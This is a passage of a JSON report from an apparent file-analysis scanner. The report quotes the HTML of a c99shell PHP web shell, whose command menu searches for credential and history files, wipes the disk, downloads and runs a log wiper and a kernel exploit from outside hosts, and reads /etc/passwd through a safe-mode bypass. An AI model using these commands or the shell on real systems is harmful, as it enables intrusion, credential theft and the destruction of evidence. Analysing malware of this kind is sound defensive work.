            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0121 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://cpanel.net",
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://google.com/search",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"
        ]
    },
    "time": "0:00:00.492008",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
